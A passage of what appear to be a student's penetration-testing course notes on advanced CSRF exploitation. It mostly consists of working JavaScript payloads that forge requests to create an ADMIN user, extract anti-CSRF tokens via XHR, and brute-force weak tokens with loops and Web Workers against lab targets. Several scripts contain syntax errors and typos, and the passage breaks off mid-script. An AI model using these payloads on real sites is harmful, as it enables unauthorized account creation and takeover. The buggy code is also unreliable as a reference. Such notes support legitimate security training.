  <li>If we are able to steal a vicitms valid cookie, we can use <strong>Burp Repeater</strong> or custom scripts like Ruby, Python or any other non-browser mechanisms to generate a tremendous number of requests.</li>
  <li>Moreover in the video section</li>
</ul>

<p>In a scenario where we cant steal the victim session cookies:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Target users might be either convinced to visit our malicious page
- We can inject our malicious code and exploit an XSS flaw against these users.
- As a result we exploit the weak anti-CSRF protection
</code></pre></div></div>

<ul>
  <li>Lets consider an implementation that generates anti-CSRF tokens with a number value between 100 and 300. This is a poor leve of randomness, cause we can brute-force it.</li>
</ul>

<p>Exploiting this only requires us to create a page with a script that generates and submits 200 forms.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- To submit a post we can use a form element
- XMLHttpRequest 
</code></pre></div></div>

<ul>
  <li>The implementation requires both a loop, in order to generate the number of requests needed, and a function that generates the same requests (except For the anti-CSRF token)</li>
</ul>

<p><img src="/assets/images/posts/ewptx/56.png" alt="Alt text" class="align-center" /></p>

<ul>
  <li>In some cases, the vuln form may be using GET. We can use <strong>XHR</strong> again; There are also agreate deal of other native methods (IMG, etc)</li>
</ul>

<p><img src="/assets/images/posts/ewptx/57.png" alt="Alt text" class="align-center" /></p>

<p>Some real-world implementations of anti-CSRF appear to use a known Ajax request to get the token.</p>

<blockquote>
  <p>If u could <strong>iframe</strong> that particular functionality, you could narrow down a valid token by leveraging JavaScript and given that each char has a different size.</p>
</blockquote>

<h2 id="videos-notes">Video’s Notes</h2>

<h3 id="advanced-csrf-exploitation---parte-1">Advanced CSRF Exploitation - parte 1</h3>

<p>This is a nice shopping site.</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">text/javascript</span><span class="dl">"</span><span class="o">&gt;</span>

<span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://targeturl.site/add_user.php</span><span class="dl">"</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">params</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">name=Talent&amp;surname=John&amp;email=talent%40site.com&amp;role=ADMIN&amp;submit=</span><span class="dl">"</span><span class="p">;</span>
<span class="err">#</span> <span class="nx">u</span> <span class="nx">can</span> <span class="nx">grab</span> <span class="k">this</span> <span class="nx">param</span> <span class="nx">via</span> <span class="nx">BURP</span>

<span class="kd">var</span> <span class="nx">CSRF</span><span class="o">=</span><span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
<span class="nx">CSRF</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span><span class="nx">url</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
<span class="nx">CSRF</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">true</span><span class="dl">"</span><span class="p">;</span>
<span class="nx">CSRF</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span><span class="p">);</span>
<span class="c1">// u can grab the content-type via BURP</span>
<span class="nx">CSRF</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">params</span><span class="p">);</span>
<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></code></pre></div></div>

<h4 id="bypass-token">bypass token</h4>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">text/javascript</span><span class="dl">"</span><span class="o">&gt;</span>

<span class="kd">function</span> <span class="nf">addUser</span><span class="p">(</span><span class="nx">token</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://targeturl.site/add_user.php</span><span class="dl">"</span><span class="p">;</span>
  <span class="kd">var</span> <span class="nx">params</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">name=Talent&amp;surname=John&amp;email=talent%40site.com&amp;role=ADMIN&amp;submit=&amp;CSRFToken=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">token</span><span class="p">;</span>

  <span class="kd">var</span> <span class="nx">CSRF</span><span class="o">=</span><span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
  <span class="nx">CSRF</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span><span class="nx">url</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
  <span class="nx">CSRF</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">true</span><span class="dl">"</span><span class="p">;</span>
  <span class="nx">CSRF</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span><span class="p">);</span>
  <span class="nx">CSRF</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">params</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// extract the token</span>
<span class="kd">var</span> <span class="nx">XHR</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
<span class="nx">XHR</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(){</span>
  <span class="k">if</span><span class="p">(</span><span class="nx">XHR</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span><span class="p">{</span>
    <span class="kd">var</span> <span class="nx">htmlSource</span> <span class="o">=</span> <span class="nx">XHR</span><span class="p">.</span><span class="nx">reponseText</span><span class="p">;</span> <span class="c1">// the source of users</span>

    <span class="c1">// extract the token</span>
    <span class="kd">var</span> <span class="nx">parser</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">DOMParser</span><span class="p">().</span><span class="nf">parseFromString</span><span class="p">(</span><span class="nx">htmlSource</span><span class="p">,</span> <span class="dl">"</span><span class="s2">text/html</span><span class="dl">"</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">parser</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">CSRFToken</span><span class="dl">"</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
    <span class="nf">addUSer</span><span class="p">(</span><span class="nx">token</span><span class="p">);</span>
  <span class="p">}</span>

<span class="p">}</span>

<span class="nx">XHR</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">targeturl.site</span><span class="dl">'</span><span class="p">,</span><span class="kc">true</span><span class="p">);</span>
<span class="nx">XHR</span><span class="p">.</span><span class="nf">send</span><span class="p">();</span>

<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></code></pre></div></div>

<p>Get token in browser</p>

<ul>
  <li>document.getElementById(‘CSRFToken’).value</li>
</ul>

<h3 id="advanced-csrf-exploitation---parte-2">Advanced CSRF Exploitation - parte 2</h3>

<ul>
  <li>Send the token page in BURP to Sequencer</li>
  <li>Run the live test</li>
  <li>Save the tokens</li>
</ul>

<p>in CMD:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sort</span> &lt;token file&gt; // get rid of duplicates
<span class="nb">sort</span> &lt;token file&gt; | <span class="nb">uniq</span> <span class="nt">-c</span> //show the most common tokens
<span class="nb">sort</span> &lt;token file&gt; | <span class="nb">uniq</span> <span class="nt">-c</span> | <span class="nb">nl 
sort</span> &lt;token file&gt; | <span class="nb">uniq</span> <span class="o">&gt;</span> valid_tokens

<span class="nb">cd</span> /var/www
nano brutePOST.html
</code></pre></div></div>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">html</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">body</span><span class="o">&gt;</span>
  <span class="o">&lt;</span><span class="nx">textarea</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">tokens</span><span class="dl">"</span> <span class="nx">row</span><span class="o">=</span><span class="dl">"</span><span class="s2">12</span><span class="dl">"</span> <span class="nx">columns</span><span class="o">=</span><span class="dl">"</span><span class="s2">60</span><span class="dl">"</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="nx">copy</span> <span class="nx">the</span> <span class="nx">valid</span> <span class="nx">tokens</span> <span class="nx">here</span><span class="o">&gt;</span>
  <span class="o">&lt;</span><span class="sr">/textarea</span><span class="err">&gt;
</span>
<span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
<span class="kd">function</span> <span class="nf">XHRPost</span><span class="p">(</span><span class="nx">tVal</span><span class="p">){</span>
  <span class="kd">var</span> <span class="nx">http</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
  <span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">target.site/add_user.php</span><span class="dl">"</span><span class="p">;</span>
  <span class="kd">var</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">tVal</span><span class="p">;</span>
  <span class="kd">var</span> <span class="nx">params</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">POST data from BURP</span><span class="dl">"</span> <span class="c1">//edit the token in the data with the 'token' variable</span>
  <span class="nx">http</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="nx">url</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
  <span class="nx">http</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">true</span><span class="dl">"</span><span class="p">;</span>
  <span class="nx">http</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">content type from BURP</span><span class="dl">"</span><span class="p">);</span>
  <span class="nx">http</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(){</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">readyState</span><span class="o">&gt;</span> <span class="mi">1</span><span class="p">){</span>
      <span class="c1">//For the SoP we dont care about response</span>
      <span class="nx">http</span><span class="p">.</span><span class="nf">abort</span><span class="p">();</span>

  <span class="p">}</span>
  <span class="err">#</span> <span class="nx">Serialize</span> <span class="nx">the</span> <span class="nx">param</span> <span class="nx">object</span>
  <span class="nx">queryParams</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nf">keys</span><span class="p">(</span><span class="nx">params</span><span class="p">).</span><span class="nf">reduce</span><span class="p">(</span><span class="nf">functions</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span><span class="nx">k</span><span class="p">){</span>
    <span class="nx">a</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="nx">k</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">=</span><span class="dl">'</span> <span class="o">+</span> <span class="nf">encodeURIComponent</span><span class="p">(</span><span class="nx">params</span><span class="p">[</span><span class="nx">k</span><span class="p">]));</span>
    <span class="k">return</span> <span class="nx">a</span>
    
  <span class="p">},</span> <span class="p">[]).</span><span class="nf">join</span><span class="p">(</span><span class="dl">'</span><span class="s1">&amp;</span><span class="dl">'</span><span class="p">);</span>
  <span class="nx">http</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">queryParams</span><span class="p">);</span>
<span class="p">}</span>
<span class="kd">function</span> <span class="nf">bruteLoop</span><span class="p">(</span><span class="nx">TList</span><span class="p">){</span>
  <span class="nc">For </span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nx">i</span><span class="o">&lt;</span><span class="nx">TList</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">){</span>
    <span class="nc">XHRPost</span><span class="p">(</span><span class="nx">Tlist</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span>
  <span class="p">}</span>
<span class="p">}</span>


<span class="c1">// Prepare the token list</span>
<span class="kd">var</span> <span class="nx">tokens</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">tokens</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sr">/</span><span class="se">\s</span><span class="sr">+/gm</span><span class="p">,</span> <span class="dl">'</span><span class="se">\n</span><span class="dl">'</span><span class="p">).</span><span class="nf">split</span><span class="p">(</span><span class="dl">'</span><span class="se">\n</span><span class="dl">'</span><span class="p">);</span>
<span class="nx">tokens</span> <span class="o">=</span> <span class="nx">tokens</span><span class="p">.</span><span class="nf">filter</span><span class="p">(</span><span class="nb">Boolean</span><span class="p">);</span> <span class="err">#</span> <span class="nx">remove</span> <span class="nx">empty</span> <span class="nx">values</span>

<span class="nf">bruteLoop </span><span class="p">(</span><span class="nx">tokens</span><span class="p">);</span>

<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/body</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/html</span><span class="err">&gt;
</span></code></pre></div></div>

<h4 id="test-the-referer-value">Test the Referer value</h4>
<ul>
  <li>Test with subdomain</li>
  <li>Test in the file name text</li>
  <li>In this case, we need to change the file name to the target.url</li>
  <li>So the referer can recognize as a trusted sender</li>
</ul>

<h3 id="nivel-2-brute-forcer-with-workers">nivel 2 Brute forcer with Workers</h3>
<p>brute.js</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">self</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">message</span><span class="dl">'</span><span class="p">,</span> <span class="nf">function </span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>

   <span class="kd">var</span> <span class="nx">tokens</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">tokens</span><span class="p">;</span>

   <span class="kd">function</span> <span class="nf">bruteLoop</span><span class="p">(</span><span class="nx">TList</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">for </span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">TList</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
         <span class="nx">console</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="dl">"</span><span class="s2">Testing: </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">TList</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span>
         <span class="nc">XHRPost</span><span class="p">(</span><span class="nx">TList</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span>
      <span class="p">}</span>

      <span class="nc">Terminator</span><span class="p">();</span>
   <span class="p">}</span>

   <span class="kd">function</span> <span class="nf">XHRPost</span><span class="p">(</span><span class="nx">tVal</span><span class="p">)</span> <span class="p">{</span>
      <span class="kd">var</span> <span class="nx">http</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
      <span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://{LABID}.csrf.labs/add_user.php</span><span class="dl">"</span><span class="p">;</span>

      <span class="kd">var</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">tVal</span><span class="p">;</span>

      <span class="nx">params</span> <span class="o">=</span> <span class="p">{</span>
         <span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Malice</span><span class="dl">"</span><span class="p">,</span>
         <span class="dl">"</span><span class="s2">surname</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Smith</span><span class="dl">"</span><span class="p">,</span>
         <span class="dl">"</span><span class="s2">email</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">malice@hacker.site</span><span class="dl">"</span><span class="p">,</span>
         <span class="dl">"</span><span class="s2">role</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">ADMIN</span><span class="dl">"</span><span class="p">,</span>
         <span class="dl">"</span><span class="s2">submit</span><span class="dl">"</span><span class="p">:</span> <span class="dl">""</span><span class="p">,</span>
         <span class="dl">"</span><span class="s2">CSRFToken</span><span class="dl">"</span><span class="p">:</span> <span class="nx">token</span><span class="p">,</span>
      <span class="p">};</span>

      <span class="nx">http</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="nx">url</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
      <span class="nx">http</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">true</span><span class="dl">'</span><span class="p">;</span>

      <span class="c1">// Send the proper header information along with the request</span>
      <span class="nx">http</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-type</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span><span class="p">);</span>
      <span class="nx">http</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
         <span class="k">if </span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// We don't care about responses</span>
            <span class="c1">// console.warn("Aborted " + token + " with status " + http.readyState);</span>
            <span class="c1">// http.abort();</span>
         <span class="p">}</span>
      <span class="p">};</span>

      <span class="c1">// Serialize the data without using JQuery </span>
      <span class="nx">queryParams</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nf">keys</span><span class="p">(</span><span class="nx">params</span><span class="p">).</span><span class="nf">reduce</span><span class="p">(</span><span class="nf">function </span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">k</span><span class="p">)</span> <span class="p">{</span>
         <span class="nx">a</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="nx">k</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">=</span><span class="dl">'</span> <span class="o">+</span> <span class="nf">encodeURIComponent</span><span class="p">(</span><span class="nx">params</span><span class="p">[</span><span class="nx">k</span><span class="p">]));</span>
         <span class="k">return</span> <span class="nx">a</span>
      <span class="p">},</span> <span class="p">[]).</span><span class="nf">join</span><span class="p">(</span><span class="dl">'</span><span class="s1">&amp;</span><span class="dl">'</span><span class="p">);</span>
      <span class="nx">http</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">queryParams</span><span class="p">);</span>
   <span class="p">}</span>

   <span class="kd">function</span> <span class="nf">Terminator</span><span class="p">()</span> <span class="p">{</span>
      <span class="nb">self</span><span class="p">.</span><span class="nf">postMessage</span><span class="p">(</span><span class="dl">"</span><span class="s2">Sir, I've finished... see you later</span><span class="dl">"</span><span class="p">);</span>
      <span class="nb">self</span><span class="p">.</span><span class="nf">close</span><span class="p">();</span>
      <span class="k">return</span><span class="p">;</span>
   <span class="p">}</span>

   <span class="c1">// Brute Loop</span>
   <span class="nf">bruteLoop</span><span class="p">(</span><span class="nx">tokens</span><span class="p">);</span>

<span class="p">},</span> <span class="kc">false</span><span class="p">);</span>


</code></pre></div></div>

<h4 id="simple-brute-force">Simple Brute Force</h4>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">html</span><span class="o">&gt;</span>
   <span class="o">&lt;</span><span class="nx">body</span><span class="o">&gt;</span>
      <span class="o">&lt;</span><span class="nx">h1</span><span class="o">&gt;</span><span class="nx">Anti</span><span class="o">-</span><span class="nx">CSRF</span> <span class="nx">Tokens</span> <span class="nx">to</span> <span class="nx">test</span><span class="o">&lt;</span><span class="sr">/h1</span><span class="err">&gt;
</span>      <span class="o">&lt;</span><span class="nx">textarea</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">tokens</span><span class="dl">"</span> <span class="nx">rows</span><span class="o">=</span><span class="dl">"</span><span class="s2">12</span><span class="dl">"</span> <span class="nx">cols</span><span class="o">=</span><span class="dl">"</span><span class="s2">60</span><span class="dl">"</span><span class="o">&gt;</span>
         <span class="mi">1679091</span><span class="nx">c5a880faf6fb5e6087eb1b2dc</span>
      <span class="o">&lt;</span><span class="sr">/textarea</span><span class="err">&gt;
</span>      <span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
         <span class="kd">function</span> <span class="nf">bruteLoop</span><span class="p">(</span><span class="nx">TList</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">for </span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">TList</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
               <span class="nx">console</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="dl">"</span><span class="s2">Testing: </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">TList</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span>
               <span class="nc">XHRPost</span><span class="p">(</span><span class="nx">TList</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span>
            <span class="p">}</span>
         <span class="p">}</span>

         <span class="kd">function</span> <span class="nf">XHRPost</span><span class="p">(</span><span class="nx">tVal</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">var</span> <span class="nx">http</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
            <span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://{LABID}.csrf.labs/add_user.php</span><span class="dl">"</span><span class="p">;</span>
            <span class="kd">var</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">tVal</span><span class="p">;</span>
            <span class="nx">params</span> <span class="o">=</span> <span class="p">{</span>
               <span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Malice</span><span class="dl">"</span><span class="p">,</span>
               <span class="dl">"</span><span class="s2">surname</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Smith</span><span class="dl">"</span><span class="p">,</span>
               <span class="dl">"</span><span class="s2">email</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">malice@hacker.site</span><span class="dl">"</span><span class="p">,</span>
               <span class="dl">"</span><span class="s2">role</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">ADMIN</span><span class="dl">"</span><span class="p">,</span>
               <span class="dl">"</span><span class="s2">submit</span><span class="dl">"</span><span class="p">:</span> <span class="dl">""</span><span class="p">,</span>
               <span class="dl">"</span><span class="s2">CSRFToken</span><span class="dl">"</span><span class="p">:</span> <span class="nx">token</span><span class="p">,</span>
            <span class="p">};</span>
            <span class="nx">http</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="nx">url</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
            <span class="nx">http</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">true</span><span class="dl">'</span><span class="p">;</span>

            <span class="c1">// Send the proper header information along with the request</span>
            <span class="nx">http</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-type</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span><span class="p">);</span>

            <span class="nx">http</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
               <span class="k">if </span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
                  <span class="c1">// We don't care about responses</span>
                  <span class="c1">// console.warn("Aborted " + token + " with status " + http.readyState);</span>
                  <span class="nx">http</span><span class="p">.</span><span class="nf">abort</span><span class="p">();</span>
               <span class="p">}</span>
            <span class="p">};</span>

            <span class="c1">// Serialize the data without using JQuery</span>
            <span class="nx">queryParams</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nf">keys</span><span class="p">(</span><span class="nx">params</span><span class="p">).</span><span class="nf">reduce</span><span class="p">(</span><span class="nf">function </span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">k</span><span class="p">)</span> <span class="p">{</span>
               <span class="nx">a</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="nx">k</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">=</span><span class="dl">'</span> <span class="o">+</span> <span class="nf">encodeURIComponent</span><span class="p">(</span><span class="nx">params</span><span class="p">[</span><span class="nx">k</span><span class="p">]));</span>
               <span class="k">return</span> <span class="nx">a</span>
            <span class="p">},</span> <span class="p">[]).</span><span class="nf">join</span><span class="p">(</span><span class="dl">'</span><span class="s1">&amp;</span><span class="dl">'</span><span class="p">);</span>
            <span class="nx">http</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">queryParams</span><span class="p">);</span>
         <span class="p">}</span>

         <span class="kd">var</span> <span class="nx">tokens</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">tokens</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sr">/</span><span class="se">\s</span><span class="sr">+/gm</span><span class="p">,</span> <span class="dl">'</span><span class="se">\n</span><span class="dl">'</span><span class="p">).</span><span class="nf">split</span><span class="p">(</span><span class="dl">'</span><span class="se">\n</span><span class="dl">'</span><span class="p">);</span>
         <span class="nx">tokens</span> <span class="o">=</span> <span class="nx">tokens</span><span class="p">.</span><span class="nf">filter</span><span class="p">(</span><span class="nb">Boolean</span><span class="p">);</span> <span class="c1">// Remove empty lines</span>

         <span class="c1">// Brute Loop</span>
         <span class="nf">bruteLoop</span><span class="p">(</span><span class="nx">tokens</span><span class="p">);</span>
      <span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span>   <span class="o">&lt;</span><span class="sr">/body</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/html</span><span class="err">&gt;
</span>

</code></pre></div></div>

<h4 id="brutepost_workerhtml">brutePOST_worker.html</h4>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">html</span><span class="o">&gt;</span>
   <span class="o">&lt;</span><span class="nx">body</span><span class="o">&gt;</span>
      <span class="o">&lt;</span><span class="nx">h1</span><span class="o">&gt;</span><span class="nx">Anti</span><span class="o">-</span><span class="nx">CSRF</span> <span class="nx">Tokens</span> <span class="nx">to</span> <span class="nx">test</span><span class="o">&lt;</span><span class="sr">/h1</span><span class="err">&gt;
</span>      <span class="o">&lt;</span><span class="nx">textarea</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">tokens</span><span class="dl">"</span> <span class="nx">rows</span><span class="o">=</span><span class="dl">"</span><span class="s2">12</span><span class="dl">"</span> <span class="nx">cols</span><span class="o">=</span><span class="dl">"</span><span class="s2">60</span><span class="dl">"</span><span class="o">&gt;</span>
         <span class="mi">00411460</span><span class="nx">f7c92d2124a67ea0f4cb5f85</span>
      <span class="o">&lt;</span><span class="sr">/textarea</span><span class="err">&gt;
</span>      <span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
      <span class="o">&lt;</span><span class="nx">h1</span><span class="o">&gt;</span><span class="nx">Workers</span> <span class="nx">results</span><span class="o">&lt;</span><span class="sr">/h1</span><span class="err">&gt;
</span>      <span class="o">&lt;</span><span class="nx">span</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">workers</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="sr">/span</span><span class="err">&gt;
</span>
      <span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
         <span class="kd">function</span> <span class="nf">startBlock</span><span class="p">(</span><span class="nx">worker</span><span class="p">,</span> <span class="nx">tokens</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">worker</span><span class="p">.</span><span class="nf">postMessage</span><span class="p">({</span>
